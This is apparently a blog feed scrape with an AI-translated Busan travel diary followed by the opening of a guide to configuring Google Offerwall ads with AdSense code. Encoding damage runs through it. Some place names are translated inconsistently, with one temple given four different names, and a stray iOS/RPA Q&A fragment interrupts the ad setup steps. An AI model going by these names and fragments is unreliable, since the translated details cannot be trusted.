boarding, the staff will take a group photo. Then, after getting off, you can decide whether to purchase the photo from them.~=14:40 Capsule Train from Cheongsapo -&gt; Upo (Haeundae) Departure! üëçüëçüëçLooks thrilling, but actually moves slowly; there‚Äôs no air conditioning inside the cabin, but it has a fan and a speaker where you can plug in your phone to play music.Enjoy the scenery along the way and take some trendy photos (?)~=15:10 Arrive at Uipo (Haeundae)Head toward the Haeundae direction (tall buildings) and come out to the intersection. On the opposite right side is the famous and delicious Salt Bread ‚Äî Jayeondo saltbread (will come back to buy later). On the left, walk straight down to the sea-facing entrance, which is the Busan Sky entrance.~=15:35 Busan BUSAN X the SKYThe glass facing Haeundae Beach has a barrier, so you can‚Äôt take photos close to it.There is a transparent glass floor bridge, but the glass is heavily worn, so the effect is mediocre; there is also a transparent glass restroom.Walking down to the caf√© and souvenir shop, you can look back at the capsule train route you just came from.Ate a fish cake sausage stick to replenish energy (taste was so-so).Besides cafes and souvenir shops, this floor also has free exhibitions.~=16:00 Leave and walk back to buy Salt Bread ‚Äî Jayeondo saltbread üëçüëçüëçOne order contains 6 pieces. We bought one to share back at the hotel. The combination of fragrant, crispy, and a slight touch of salt for flavor made it very delicious.There are many large-scale construction and renovation projects in Haeundae, seemingly preparing for the 2030 World Expo bid (which has already failed). Return to the hotel to rest, then go to Mijeanwang for dinner in the evening.17:50 Arrive at Matchandeul Salted Grill Haeundae BranchThere is a machine at the entrance for waiting. Enter your email to receive a notification. At 17:50, a small queue started to form.Click the button to check your current number. You will also receive an entry notification email when it‚Äôs your turn, which is very convenient; also, be careful as the building opposite and next door are under construction.18:25 Enter for DinnerIt took about more than 30 minutes to enter.We directly ordered the double set (includes one portion of each meat + soybean paste soup + rice pot) and a bottle of Cass beer, costing about NT$1,500. They will grill it well for you. Reviews say the meat is tasty but the portion is small and you need to wait in line.~=20:30 Return to Haeundae Main Street after dinnerStrolled along Haeundae Beach Road to digest a bit and bought ice cream from a matcha specialty shop as a dessert to refresh.Next door is the newly opened Olive Young Delight Project store, where we did some shopping; many items are buy two get one free, and you can get an instant tax refund on-site for purchases over 15,000 KRW.Went for a walk at Haeundae Beach again before heading back to the hotel to rest.Day 3 07/31 (Thu) Cheongsapo, Spa Land, Coastal Train, Busan Yacht TourBecause yesterday we only transferred at Cheongsapo without exploring, we came again today.11:00 Took the bus to CheongsapoThe bus from Haeundae directly to Cheongsapo is a small bus. It passes through communities like Busan Sanso, where the roads are narrow and steep.11:30 Arrive at CheongsapoNearby, we randomly found a restaurant for lunch (Gohyang katsu). I ordered a pork cutlet sandwich; the meat was thick, tender, and reasonably priced.~=12:30 DIART COFFEE Honey Butter ToastAfter lunch, we walked out to the highly recommended Busan Honey Butter Toast at DIART COFFEE. We ordered one toast (‚Ç©10,000) and coffee (‚Ç©5,500) to take a break.For how to eat, you can refer to the card. In short, cut the bread into pieces first, then evenly spread butter and honey before eating. The honey is not too sweet, combined with creamy butter and crispy bread, making it delicious without being greasy.~=13:30 Return to Cheongsapo to catch the coastal train back to Wi-po (Haeundae)Yesterday‚Äôs ticket was no longer valid, so I used the Busan Pass to exchange for another coastal train ticket; since this is a mid-station boarding point, I could only stand in the last row.There were several observation decks along the way, but we didn‚Äôt get off because it was too hot.~=13:55 Arrive at Oe-po (Haeundae)After returning to Haeundae, we walked and took a bus to Shinsegae Spa Land.~=14:30 Arrive at Shinsegae Department StoreSkipped shopping, headed straight to Spa Land on the first floor.14:40 Spa LandRedeem Spa Land using the Busan Pass. You can also purchase it in advance on Kkday without buying the Pass.Upon entry, you will receive a sensor wristband. Use the wristband to store your shoes and clothes. Inside, change into the special clothing for the sauna. You can also visit the sauna first (full nudity required) before going to the sweat sauna. The sweat sauna entrance is in the direction of the women‚Äôs changing room.The first floor has a sunbathing area, nail salon, snack stalls, and various types of jjimjilbang (sauna rooms) (very crowded during summer vacation, almost all are full). The third floor has a restaurant (where you can eat grilled eggs and instant noodles), massage services, massage chairs, and a yoga room.After the sauna, we went to the sunbathing area to lie down and soak up the sun, ordering a drink (very sweet). All purchases inside the venue are made by scanning the wristband, with payment settled upon exit. Honestly, I didn‚Äôt get to experience the sweat sauna this time because it was insanely crowded. I‚Äôll try it next time.17:00 Prepare to meet at the yacht pierFor the 18:30 session, you need to arrive early for roll call at the meeting point.Before departure, we grabbed some food to fill up at Shinsegae Department Store B1.Take the subway to Dongbaek Station (Dongbaek)After exiting the station, it takes about 15 minutes on foot to reach the pier. The pier area only has vending machines and restrooms, which are dirtier and crowded with queues; it is recommended to buy what you need and use the restroom in the city before coming here.~=18:00 Arrive at the yacht pierAfter passing through the tourist center, you will arrive at the pier meeting point. Each boat operator has a different pier meeting location.Around 18:15, the boat staff appeared to start organizing and taking attendance, and collected the night surcharge fee on site (5,000 KRW per person).18:30 Yacht Departure üëçüëçWear a life jacket when boarding the boat and sit in the front seat on the second floor.It runs slowly and steadily, crossing the Gwangandaegyo Bridge along the way. However, if you are prone to seasickness, it is still recommended to take motion sickness medication.General Route Map:~=18:50 Before Arriving at Gwangalli BeachAbout 20 minutes later, we will arrive at the waters in front of Gwangalli Beach, where many visitors are playing SUP. We will stop here to set off fireworks; the fireworks are lit by the crew members of various yachts sailing during this time, but since it is still bright, they are not very visible.Staff along the way are also very enthusiastic in helping to take photos.~=19:00 Return tripCaught the sunset glow.~=19:20 Return to landAfter returning to the mainland, we took the bus back to Haeundae.~=19:35 Return to HaeundaeHaeundae Beach has a market and food trucks.~=19:55 Head to Haeundae for Grilled Eel PUNGCHEONMAN üëçüëçThere are many seats inside the store, so no need to wait in line; we just walked in.We ordered grilled eel, grilled beef slices, two cold noodles, and draft beer, totaling NT$2,387.Grilled eel is crispy, tender, and juicy, very delicious with no fishy smell at all; grilled beef slices are good but ordinary; the cold buckwheat noodles resemble brown sugar shaved ice but actually have a soy sauce flavor with crushed ice, making it refreshing and tasty.After eating, we strolled along Haeundae Street, visited Haeundae Traditional Market (forgot to try the seafood pancake, so frustrating!), and bought some souvenirs. Tomorrow we will leave Haeundae.Day 4 08/01 (Fri) Nampo-dong, Songdo Marine Cable Car, Yonggung Cloud Bridge, Gamcheon Culture Village, Busan Tower09:15 Leaving for Nampo-dongEarly in the morning, prepare to leave Haeundae and head to Nampo-dong.~=10:30 Arrive at Jagalchi Station, Hotel Noah hotelLuggage Storage.BIFF SquareRight outside the hotel is BIFF Square, which is lively and convenient.~=11:00 Lunch ‚Äî Hongkong 0410 Nampo 1st BranchNear noon, we casually picked a restaurant inside BIFF for lunch. This one serves Korean-Chinese cuisine.Ordered fried dumplings, sweet and sour pork (medium, but a small size might be better), and Korean-style jajangmyeon.Fried dumplings are a bit greasy, but the sweet and sour pork is good.12:15 Take the bus + walk to Songdo Cable Car StationAfter getting off the bus, there‚Äôs about a 10-minute walk. It‚Äôs too hot, so let‚Äôs first go to the convenience store to get a self-made iced latte to cool down.After entering, line up at the counter to exchange your Busan Pass for the cable car ticket (the Pass is for the crystal cabin, round trip, so keep the ticket safe).After getting the ticket, take the escalator upstairs to line up for the cable car. (They gave out lollipops, but I didn‚Äôt take one)12:25 Board the vehicle5‚Äì6 people per vehicle.~=12:35 Arrive at SongdoTurn right immediately and walk down.Go down the stairs, turn right, and walk straight to reach the ‚ÄúSongdo Dragon Palace Suspension Bridge.‚Äù~=12:40 Arrive at Songdo Yonggung Suspension BridgeUse the Busan Pass at the nearby ticket office to exchange for an entry ticket.There is no shade here at all, and it‚Äôs very sunny under the strong sun. You can get a bird‚Äôs-eye view of the entire Songdo Cable Car.~=13:00 Return to Songdo Cable Car, line up for the cable car back~=13:25 Leave Songdo and walk back to take the busThere is also an observation deck near the cable car, but we skipped it because it was too hot.Walk back to the bus stop, return to the city, and then transfer to a minibus to Gamcheon Culture Village.~=14:20 Gamcheon Culture VillageWe didn‚Äôt plan to take photos, just visiting spots; it felt like a rainbow village with some cafes. We walked through quickly and took the bus back to the hotel from another bus stop. The buses here are minibuses, similar to those in Yangmingshan. The drivers are aggressive, and the buses are crowded with many passengers.~=15:00 Return to Noah Hotel for rest View from the room window I initially thought there were no coin-operated washing machines, but it turns out there is a free washing machine available in the third-floor restroom. ~=17:40 Departing for dinnerAbout a 10-minute walk from the hotel.~=17:50 Throat Pot Lid BBQ ‚Äî Moggumung Nampo Branch üëçüëçüëç The unique feature is that the grill plate is a pot lid. The side dishes include a piece of vitamin C (I checked, and taking vitamin C before or after BBQ can reduce free radicals and lower the risk of cancer). At least order three servings of meat, each grilled by the staff and served to you. Ordered two pork, one beef, two bowls of instant noodles, and Cass beer. Each meat portion costs 18,000 KRW. The total was NT$1,060, which is very affordable, and the meat was delicious!! Highly recommended. ~= 18:30 Walk to Busan TowerAfter eating, walk all the way to Busan Tower to digest, which takes about 20 minutes.The whole way was lively, with many restaurants to eat at. The navigation should actually be set to ‚Äî Yongdusan Media Park Entrance , where there is an escalator going up; from here, you need to climb a short hill (about 5 minutes).19:00 Arrive at the foot of Busan Tower, wait for sunset before going up to see the night viewFirst, visit the souvenir shop for a browse.19:30 Go up Busan TowerShow the Busan Pass at the first-floor counter to exchange for tickets and enter.You can scan the QR code on the Busan Tower ticket to play a puzzle game. Solving all the codes will earn you a small prize. (I have written the codes later.)There were already many people waiting when we arrived.19:45 Busan sunset glow.20:00/20:10‚Ä¶ There was a light projection and fireworks show, but the effect was mediocre.20:00 Busan Night View~= 20:10 Leave the towerThere are still many spots to take photos before leaving.~= 20:15 Redeem Small SouvenirsBefore going down the mountain, remember to go to the unmanned ticket machine (Ticket Box) outside: Enter password: 19731121 (Busan Tower construction date) You can use the pass to redeem small prizes at the souvenir center outside the blue house (not the one on the first floor of Busan Tower). A small souvenir is a card, available in various styles. I chose a transparent Busan Tower card:Heading down from Yongdusan Park. There is an escalator here!!! (Going up only, no down escalator, part of it is under renovation)20:30 Return to ‚Äî ÈæçÈ†≠Â±±Á¥ÄÂøµÂÖ¨ÂúíÂÖ•Âè£ Yongdusan Media Park EntranceRemember, going from here to Busan Tower is closer.Strolled around the shopping street and found an HBAF almond specialty store, which seems to have the most complete range of flavors. Bought the Yellow combo pack (with small packets inside) along with some unique flavors (like popping candy, which really pops, and spicy stir-fried rice cakes) and popular flavors (honey, Oreo, corn) as souvenirs to take home.20:45 Return to ‚Äî BIFF Square to buy late-night snacksThere are many street vendors here, and the floor has celebrities‚Äô handprints.Makgeolli, BHC Fried Chicken ‚Äî BHC Chicken Busan Nampo Branch (right at BIFF Square) üëçüëçFinally bought and ate: Makgeolli: Similar to millet wine or fermented rice wine, very good. BHC Boneless Fried Chicken: The seasoning and chicken are tender and very delicious. 00:00 Good night, NampoAround 00:00, the street vendors all clear out.Day 5 08/02 (Sat) Lotte Department Store, Yeongdo Bridge Opening (Only on Saturdays)10:45 Lotte Department Store Gwangbok Branch, Lotte Supermarket ‚Äî Lotte Dept. Store Gwangbok Branch Aqua MallAround 10:XX, head out. Lotte Department Store opens at 10:30, so walk there slowly.First, head to the B1 food court caf√© for a quick breakfast. (So-so, the coffee is Lungo)11:30 Start wandering around the department store randomly Bought several clothes at the Kodak store (on average NT$300‚Äì$500 cheaper than Taiwan proxy shopping).The store offers direct tax refund. Bought a handheld fanUse the receipt to find the tax refund machine in the B1 food court to print the tax refund form, then go to the airport to get cash refund. (About NT$60 refund) The water dance show starts every hour from 11 AM at the department store. It‚Äôs quite spectacular.12:30 B1 Downtown HamburgerAfter getting tired from walking, we went to B1 at noon to eat Downtown Burgers; I get the reasoning, but American-style burgers also offer kimchi!After eating, we strolled around the department store‚Äôs rooftop observatory (very sunny and hot).~=13:30 Exit the department store and wait outside at Yeongdo Bridge for the bridge to openIt‚Äôs very sunny outside, and the crowd grows larger as it gets closer to 14:00; at this time, an ajumma came over and told us that from 8/2 to 8/30, due to the heat, the event was moved to 20:00!! Shocked!! Then everyone started spreading the word that it was changed to 20:00, and people began to slowly disperse.Later, I saw the announcement banner on the railing. (The board on the left shows the regular schedule)13:50 Return to Lotte Department Store and Lotte Mart to continue wandering aroundLotte Supermarket also sells some souvenirs and skincare products (similar to Carrefour).B1 Tax Refund MachineAfter searching for a long time, I finally found the tax refund machine on a small alley next to Din Tai Fung. If it‚Äôs not an immediate tax refund, you need to scan the receipt barcode here to get the tax refund form, and finally receive the refund at the airport. (A bit troublesome) I just learned that Korea has different tax refund agencies: Global Blue, GLOBAL TAX FREE, Easy Tax Refund, CubeRefund, and eTAX FREE, and you can only use the corresponding refund machines ; I saw a cash refund machine at Olive Young that was GLOBAL TAX FREE, but my receipt is CubeRefund, so I still have to get the refund at the airport.16:35 Return to hotel to restAfter getting tired from walking, I went to B1 to buy Korean red beans and peach snacks, along with a convenience store shake made with an old recipe (iced cup + banana milk + unsweetened black coffee). Then I walked back to the hotel through the underground shopping street to rest.19:00 Leave the hotel to visit BIFF Olive Young for a strollI didn‚Äôt get to explore Haeundae earlier, so since I had some time, I came to check it out. This store is very big, with many staff who are all very friendly.Souvenirs19:40 Arrived at Yeongdo Bridge, waiting for the bridge to openUnder the bridge, there is a booth for composite souvenir photos.Traffic control will start around 19:50.20:00 Bridge OpeningFirst, watch from under the bridge. Around 20:05, when it‚Äôs almost over, move up.There was a projection introducing the history of Yeongdo Bridge, but possibly due to the projector angle issue on the first day, it was hard to see clearly.20:15 The bridge lowered again, traffic resumed20:30 Dinner ‚Äî Ton Black &amp; Tempura Nine On the way back to the hotel at night, we casually found a pork cutlet restaurant to eat (the pork cutlet was still tender and delicious). One actual charge of NT$366 ~=21:50 Return to hotel to restDay 6 08/03 (Sun) Lotte Department Store, Bupyeong Kkangtong Market, Baeksan Bay Cultural Village, Bokcheon Temple Night View Today was spent wandering aimlessly to kill time. The content is not recommended for reference and is purely a record.10:00 Head out and eat first ‚Äî Egg Drop Located across from Lotte Department Store in the shopping street. Order at the machine on the first floor, take a number ticket, then go upstairs to find a seat (you should check for available seats upstairs first). Waited for about 20 minutes Ordered a ham and cheese omelette toast + hash browns + iced coffee: 8,400 KRW It‚Äôs good, but I think some brunch spots in Taiwan taste better than this.11:00 Eat well before setting off againOn the way to Lotte Department Store, there is a ‚ÄúBig Shop‚Äù Busan souvenir store that specializes in Boogi and Busan-themed merchandise.Lotte Department Store Gwangbok Branch, Lotte Supermarket ‚Äî Lotte Dept. Store Gwangbok Branch Aqua MallBored, continued browsing Lotte Department Store.11:45 B1 Muguk Table Steamed Dishes Lotte Dept. Store Gwangbok BranchAfter several days of heavy-flavored food, I wanted something lighter for lunch. Rice must be ordered separately. It has little to no flavor. After eating, we strolled around a bit more.12:50 Leave Lotte Department Store and head to Sky Eye Observatory ‚Äî Yeongju Haneul Nun ObservatoryWandering nearby with no particular plan, I found an observation deck I missed last year. There‚Äôs a direct bus (21 minutes), so I went there. Most buses in Busan are nearly brand-new electric buses with very cool air conditioning. Passing by Last year‚Äôs spot: Busan Station 13:00 Sky Eye Observatory ‚Äî Yeongju Haneul Nun ObservatoryAfter getting off at the bus stop, walk across the street and down to see it.The scenery here is great, offering a full view of Busan‚Äôs Nampo area.Heading down to Bupyeong Can Market ‚Äî First, buy the recommended The Liter hand-shaken drink Only recommend: Blueberry Yogurt Smoothie, available in 600ML or 1,000ML sizes; tasty and refreshing without being too sweet or thirst-inducing. Price is about 4,300 KRW.Bupyeong Canned Food MarketThe canned food market has many stalls selling dried goods, groceries, and seafood (like a traditional market), covering a large area.Bupyeong Canned Food Market ‚Äî Milgot Red Bean Cream Mugwort Rice Cake üëçIt is probably the most famous store in the canned market, known for its specialty ‚Äî red bean cream mugwort rice cake. Because I don‚Äôt speak Korean, I just took a photo and showed it directly to the staff to order this. The staff said it should be kept frozen, and it‚Äôs best to defrost it for half an hour to an hour before eating. Also bought a savory bread, which was pretty good! Later, I took it back to the hotel to eat. The mugwort rice cake has a chewy texture paired with soybean powder and red bean cream filling. I found it quite unique and slightly sweet. If you pass by, you should give it a try!Also bought another box of BHC Fried Chicken to have for dinner.18:30 Depart AgainAfter resting in the evening, we went out again, mainly to visit Fokcheon Temple for night views. First, we stopped by Baekcheon Bay Cultural Village.18:45 Baekcheon Bay Cultural Village The most famous spot here is ‚Äî Enjoy the view, coffee, and foot bath ‚Äî VIEW, FOOT BATH CAFE foot bath cafe.However, since it was late, we only had a brief look around; there are many cafes and small shops along the coast, but maybe because it was late, there were few people. The coastal walkway below was under repair and inaccessible. The weather was cloudy today, so the scenery was not great.19:00 Head to Bokcheonsa TempleAfter leaving Baishan Bay, head up towards Foguang Temple.Originally, the map showed the bus was only one stop away, so I thought walking would be fine. After a few steps, I gave up; the map said bus 1 stop (1 minute), but walking actually took about 20 minutes (all steep, shaky hills). Yeongdogu 1 or 5 are both fineOnly take one stop to the next station Sinseon Elementary School, the rest must be on foot:After getting off, I was stunned; it was still a very steep and shaky hillside. From here, walk all the way up:After passing the elementary school, you will see the entrance to Fokcheon Temple:This is just the beginning; you still have to climb a very steep and shaky hillside all the way up to reach Bokcheon Temple: There will be vehicle traffic here, please pay attention to safety ‚ö†Ô∏è19:25 Arrive at Bogwangsa Temple Arrived at Bokcheon Temple around 19:25 (almost exhausted). The map said 10 minutes, but since it was all uphill and included breaks, it actually took about 25 minutes.But the more tragic thing is ‚Äî it closed! It closed! It closed!That‚Äôs right, Bukhansan Temple is not really a public tourist spot. It is a quiet temple, and the gates close at a certain time. According to a colleague, after around 18:00, you can only enter but not exit. They don‚Äôt rush people out, but once the gate is closed, no one is allowed in.Tragic, we could only view the scenery from the loft outside the station. Later, some visitors who came for the same reason also stood here. However, seeing us sweating heavily, the abbot threw us two cans of ice water from inside. We were so grateful.View of the cityscape from here.Finally, I casually took a photo of the night view before heading down the mountain. I originally wanted to come here after seeing photos from other bloggers:This is what it should really look like insideOn the way down the mountain, it was all downhill and completely dark:It is a very quiet village. After walking down, we took the bus back to Jagalchi Station.Before heading back to the hotel, I bought the Seed Sugar Cake at BIFF Square, where many people were lining up. I found it too oily and sweet, not very impressive.Around 22:00, it started raining in Busan! Luckily, our trip was almost over.Day 7 08/04 (Mon) Busan Seomyeon, Shinsegae Department Store, Korean BeefIn the morning, head out and move to Seomyeon Station.10:45 Arrive at Seomyeon StationAfter arriving, we decided to store our luggage directly at the subway station. Other places like Lotte Department Store also offer luggage storage. Luggage storage here is very expensive: drop off at 10:45 AM, pick up at 8:10 PM. Charged 6,000 + 7,000 KRW (about NT$280).There is also an Olive Young in the underground shopping area at this station, so we restocked there again.11:00 Lunch Korean Style Knife-cut Noodles ‚Äî Gijang SonkalguksuAfter shopping until nearly noon, we went to a nearby market to eat Korean-style kalguksu (knife-cut noodles).The menu is very simple, offering only knife-cut noodles and seaweed rolls. We ordered seaweed rolls to share and I had the knife-cut cold noodles. The noodles were chewy and refreshing; the downside was the lack of toppings (meat), making it a plain carb-only dish.After eating, walk back to Lotte Department Store.The Liter Seo-myeon Medical Street BranchBought another Liter of blueberry smoothie yogurt to refresh the palate. The ajumma here is very enthusiastic.Lotte Department Store ‚Äî Busan Main BranchI found it hard to shop here, or rather, it‚Äôs even harder to shop than at Lotte Department Store - Gwangbok Branch yesterday. There are fewer floors and fewer stores; the only advantage is a large public resting area upstairs where you can charge your devices and rest.There is also a Busan souvenir shop here, but it has far fewer items than the one in Nampo.After visiting the LEGO store, not knowing where to go next, we decided to take the bus to explore Shinsegae Department Store. Another NC Department Store in Seomyeon has closed. If you want to shop elsewhere, you might try Jeonpo Coffee Street, which has many small shops (similar to Dongdaegu area), but it may not be very interesting for men.Busan is good! The slogan ‚ÄúBusan is good‚Äù is seen everywhere in Busan, and based on my travel experience, it‚Äôs truly accurate. There are plenty of buses, transportation is convenient, buses are new and cool, prices are cheap, and the food is delicious.Shinsegae Department Store ‚Äî Shinsegae Centum City üëçüëçüëçA few days ago, I only visited Spa Land and didn‚Äôt explore the area. This time, I‚Äôm making up for it. Shinsegae Department Store Super Big (World‚Äôs Largest According to Guinness) has a lot to explore. If you haven‚Äôt had enough shopping, next door is also Lotte Dept. Store Centum City Branch.Consisting of two buildings, each with several floors, and each floor has a large area; I casually recorded the prices of La Lebo in Busan (located on the first floor).There is a free dinosaur park called ZOORAJI on the rooftop of this building, perfect for taking kids out.We wandered around casually; basically, all brands and all types of counters were available.On the first floor of another building, I found Shake Shack, so I had to try it:SHAKE SHACK BUSAN CENTUMI ordered the crispy chicken set. Besides their signature items, I think the chicken is tender and juicy, and also very tasty.The pager seemed to have a problem; it was actually ready earlier but didn‚Äôt ring. The nostalgic good taste. Travelogues: Osaka Shack Shake / Bangkok Shake Shack~=17:00 Leave Shinsegae Department Store~=17:45 Return to Tanjeon Station (Seomyeon)Preparing to eat Korean beef tonight.Once you exit Tano Station, you can see the sign pointing to Tano Coffee Street. There is a standalone Olive Young store right outside.There are many coffee shops and small stores in the Tano area, somewhat like the atmosphere of the East District.Hwarok Restaurant, Deonpo Branch ‚Äî flowerbeefhouseIt has a bit of an East District trendy cafe vibe. Luckily, we made a reservation in advance on CatchTable; otherwise, there would be no seats available on-site. Ordered a Korean beef set + jjajangmyeon + Cass beer. The Korean beef was tender but lacked beef flavor, so I found it average; considering the actual price of NT$2,458, the cost-performance ratio is not very high, not as good as the throat lid grilled meat we had a few days earlier. The advantages are mainly beautiful photo spots and friendly staff who can speak Chinese.19:15 Walk back to Seomyeon Station after dinnerThere are really many small shops, cafes, and even a ZARA from Tampo to Seomyeon.After returning to Seomyeon Station, go to Lotte Department Store B1 food court to buy food, then prepare to head to the airport hotelThere is also a supermarket here. In the end, we bought this takoyaki to eat back at the hotel, choosing the Korean flavor on the far right.~=20:30 Head to the airport hotel This time, heading in the opposite direction toward Gaya University, also on a Tuesday, it felt like seeing myself who had just arrived in Busan last Tuesday.~=21:00 Arrive at AIR SKY HOTELThe hotel is located at the station before the airport ‚Äî Seomyeon West Busan Distribution Area Station, with CU/GS25 convenience stores directly across the street. This room and bathroom were the largest and best-equipped during the three days, but we only stayed as guests for one day.The room window offers a direct view of planes taking off and landing.Bought peach wine at the convenience store to go with the takoyaki I just got. I think this takoyaki is great. Although it got soft after bringing it back, it‚Äôs made with black squid ink as the base, combines the crispiness of Taiwanese takoyaki with Korean spicy sauce, and tastes really good. üòãDay 8 08/05 (Tue) Busan Gimhae International Airport, Return TripTime flies, and the eight-day trip to Busan is coming to an end. The last day only includes a trip to the airport.From the hotel, take one stop to reach the airport (about 10 minutes).After arriving at the airport, go directly to the second floor for international departures. Still sleepy in the morning, forgot to apply for SES to speed up the next entry process.Tax RefundIf you have a tax refund slip to claim, remember to follow this article to process it.I lost my tax refund slip‚Ä¶There are many self-check-in kiosks along the edge of the second floor. You can check in and select seats right here. You can also see that the third floor has many food options and shops.The counter was assigned to D at the far edge. Busan Air‚Äôs free baggage allowance is only 15 KG. Check if the portable charger is placed inside a ziplock bag. After checking in your luggage, be sure to wait in that area for 5 minutes to see if there are any issuesThat day, someone was repeatedly announced over the PA system because they couldn‚Äôt be found‚Ä¶ ~= 09:30 Departure and Security Check The departure hall is small, with only one row; there are a few duty-free shops, a convenience store, and a caf√© offering limited snacks. (If you‚Äôre very hungry, make sure to eat outside before passing through departure.) Since it is a dual-use military and civilian airport, taking photos of the planes outside is not allowed.Not sure what to buy, so I got two cans of GD alcohol from the convenience store to bring back to Taiwan.Delay 11:07 Departure, Early Arrival at 11:58Busan Trip a Great Success!SouvenirsDidn‚Äôt buy much.Thank you for reading If you enjoy my travelogue, please consider purchasing the Korea Busan Pass VISIT BUSAN PASS through my referral link. I will receive a small commission. Thank you.If you have any questions or suggestions, feel free to contact me.More Travelogues Tokyo Area Travel GuideÔΩúKawagoe Little Edo &amp; Atami Fireworks Festival 5-Day Itinerary Busan Travel GuideÔΩú8-Day Itinerary with VISIT BUSAN PASS for Seamless Exploration San‚Äôin &amp; Kansai 7-Day Solo TripÔΩúExplore Izumo, Matsue, Tottori, Himeji, Osaka, Kobe Bangkok Travel GuideÔΩú5-Day Independent Trip Highlights in Thailand Kyushu 9-Day Independent TripÔΩúBusan to Hakata Cruise Entry and Scenic Tours Sanyo Region Travel GuideÔΩú6-Day Hiroshima &amp; Okayama Itinerary for Freedom Seekers Kyushu 10-Day Solo Travel GuideÔΩúExplore Fukuoka, Nagasaki &amp; Kumamoto Efficiently Nagoya One-Day Quick TripÔΩúPeach Aviation Flight Experience and Travel Tips Tokyo 5-Day Travel GuideÔΩúTop Tips for Food, Stay &amp; Transport Kyoto Osaka Kobe 8-Day ItineraryÔΩúFree Travel Guide with Food, Stay &amp; Transit TipsFound this guide useful? Use my KKday referral link to book your trip‚ÄîI‚Äôll earn a small commission to support more content like this. Thank you! üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Google Offerwall AdsÔΩúBoost Content Creator Revenue with Minimal Restrictions", "url": "/posts/zrealm-dev/google-offerwall-ads-boost-content-creator-revenue-with-minimal-restrictions-ba132457e6a5/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, google-ads, offerwall, google-adsense, jekyll", "date": "2025-07-24 16:15:09 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Google Offerwall Ads ‚Äî A New Revenue Option for Content CreatorsA Brief Discus...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Google Offerwall Ads ‚Äî A New Revenue Option for Content CreatorsA Brief Discussion and Trial of Google Offerwall Ads: Quickly convert existing traffic content into limited small payments or access only after watching ads.Live Demohttps://zhgchg.li/posts/ba132457e6a5/ Live Demo -&gt; https://zhgchg.li/posts/ba132457e6a5/Google Offerwall Adshttps://support.google.com/admanager/answer/13860694?hl=zh-HantGoogle Offerwall is, in my opinion, a reward-based Offerwall ad that combines the features of rewarded ads. Developers can easily require users to complete tasks before accessing specific website content pages. The tasks are Offerwall reward tasks, which can be set as completing surveys, watching ads, making small payments, subscribing to newsletters, or integrating tasks from your own system. The rewards grant access rights that can be unlimited for several hours or days, or limited by quantity. All of this can be achieved simply by embedding Google Adsense dynamic ad code, without the need to develop your own system.‚úÖ Advantages Easy Implementation: Simply embed the dynamic ad code on your website once, and use it for life. Direct Profit: Similar to Google Adsense benefits, there is no need to build a complex advertising system or data tracking system yourself; nor do you need to find advertisers to place ads. Everything is managed and operated by the platform. Flexible and Diverse: Provides more flexible and diverse content and monetization methods. Cross-platform: Supports both mobile and desktop versions. ‚ùå Disadvantages Low Bids: This is also a common issue with Google AdSense, where ad bids are low. Easily Blocked: Since Google Offerwall is purely a front-end ad overlay, it can be easily bypassed by ad blockers or users using developer tools; therefore, it is not recommended to implement it over sensitive, important, or valuable content. üìù Technical Requirements You need to apply and get approved by Google Adsense first.The threshold is now lower; as long as you have a website URL and 5‚Äì10 articles, you can basically get approved. The website needs to embed dynamic ad code in the HTML Head embed dynamic ad code ‚ù§Ô∏è Suitable Scenarios For Advertising: Similar to Google Adsense, suitable for small to medium content websites or personal blogs without self-sold ad spaces, such as sites hosted on Wordpress or GitHub Pages. Besides displaying regular ad spaces, you can also set up Offerwall reward wall ads for valuable content articles.This article uses For Advertising as a case study; currently, except for advertising, other features are still in Beta. For surveys, micro-payments, and newsletter subscriptions: Any website can use this mechanism to quickly create pop-up ads. Installation and Activation StepsEmbedding Dynamic Ad CodeFirst, confirm that the website has embedded the Google Adsense ad code. If dynamic ads were used before, this step can be skipped.Go to Google Adsense -&gt; Ads -&gt; By site -&gt; Get code:Place the code inside the website‚Äôs &lt;head&gt;&lt;/head&gt; section:&lt;head&gt; //... &lt;script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3184248473087645\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;/head&gt;Creating Offerwall AdsGo to Google Adsense -&gt; Privacy &amp; Messages -&gt; Manage -&gt; Create Message: You can also view ad revenue on this page.Set up Offerwall Ads: 6. What are the main features of iOS 17?iOS 17 brings several new features, including improved customization options, enhanced messaging capabilities, and smarter widgets. It also introduces new privacy settings and better integration with other Apple devices. How can RPA improve business processes?Robotic Process Automation (RPA) can automate repetitive tasks, reduce errors, and increase efficiency. It allows businesses to save time and costs while improving accuracy and compliance in their operations. Advertisement Name Your Website: Set the website to apply Included and Excluded Web Pages: You can set URLs to include or exclude.Here, I set it to trigger only for URLs under the path https://zhgchg.li/posts/. Default Language: Set the default language and other supported languages. You can switch languages in the top left corner to edit content in different languages. Measurement: You can set after how many page views the trigger activatesHere, I set 0 to trigger on the first time. Reward Ads: You can set rewards that unlock content upon task completion, allowing unlimited views within a time frame or a limited number of webpage views. After the reward expires, the task must be completed again.Here, I set it so that completing the task once grants unlimited viewing for 24 hours. Copywriting Settings: Specify the copy content, and remember to upload a logo to enhance brand strength. Style Settings: After clicking on the 7 texts, you can set the text style and color here.You can refer to Testing Method and add ?fc=alwaysshow&amp;fctype=monetization to the page URL to preview the result. Publish Changes: Remember to click publish after setting everything up. Reward completion message, cannot be changed at the moment.Confirm the advertisement is in the published status.Test Offerwall AdsUse an incognito browser and make sure ad blockers and anti-tracking extensions are disabled, then visit the webpage specified in the rules:https://zhgchg.li/posts/c008a9e8ceca/ Success üôåüôåüôåTry to use Chrome incognito mode for testing. Safari requires disabling ad 